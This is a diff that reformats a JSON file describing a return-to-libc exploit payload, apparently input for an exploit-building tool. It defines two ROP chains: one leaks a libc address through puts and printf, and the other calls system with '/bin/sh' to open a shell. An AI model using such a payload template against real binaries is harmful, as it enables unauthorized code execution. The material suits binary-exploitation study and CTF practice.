@@ -1,1 +1,62 @@
-{"name":"Ret2Libc","type":"PAYLOAD","exploitObjectList":[{"name":"leakLibc","type":"ROP_CHAIN","exploitObjectList":[{"instructions":["ret"],"type":"INSTRUCTIONS_GADGET","base":"exe"},{"instructions":["pop rdi","ret"],"type":"INSTRUCTIONS_GADGET","base":"exe"},{"symbol":"puts","type":"SYMBOL_GADGET","symbolType":"got","base":"exe"},{"symbol":"printf","type":"SYMBOL_GADGET","symbolType":"plt","base":"exe"}]},{"name":"callSystemBinSh","type":"ROP_CHAIN","exploitObjectList":[{"instructions":["pop rdi","ret"],"type":"INSTRUCTIONS_GADGET","base":"exe"},{"string":"/bin/sh\\x00","type":"STRING_GADGET","base":"libc"},{"symbol":"system","type":"SYMBOL_GADGET","symbolType":"sym","base":"libc"}]}]}
+{
+    "name": "Ret2Libc",
+    "type": "PAYLOAD",
+    "exploitObjectList": [
+        {
+            "name": "leakLibc",
+            "type": "ROP_CHAIN",
+            "exploitObjectList": [
+                {
+                    "instructions": ["ret"],
+                    "type": "INSTRUCTIONS_GADGET",
+                    "base": "exe"
+                },
+                {
+                    "instructions": [
+                        "pop rdi",
+                        "ret"
+                    ],
+                    "type": "INSTRUCTIONS_GADGET",
+                    "base": "exe"
+                },
+                {
+                    "symbol": "puts",
+                    "type": "SYMBOL_GADGET",
+                    "symbolType": "got",
+                    "base": "exe"
+                },
+                {
+                    "symbol": "printf",
+                    "type": "SYMBOL_GADGET",
+                    "symbolType": "plt",
+                    "base": "exe"
+                }
+            ]
+        },
+        {
+            "name": "callSystemBinSh",
+            "type": "ROP_CHAIN",
+            "exploitObjectList": [
+                {
+                    "instructions": [
+                        "pop rdi",
+                        "ret"
+                    ],
+                    "type": "INSTRUCTIONS_GADGET",
+                    "base": "exe"
+                },
+                {
+                    "string": "/bin/sh\\x00",
+                    "type": "STRING_GADGET",
+                    "base": "libc"
+                },
+                {
+                    "symbol": "system",
+                    "type": "SYMBOL_GADGET",
+                    "symbolType": "sym",
+                    "base": "libc"
+                }
+            ]
+        }
+    ]
+}
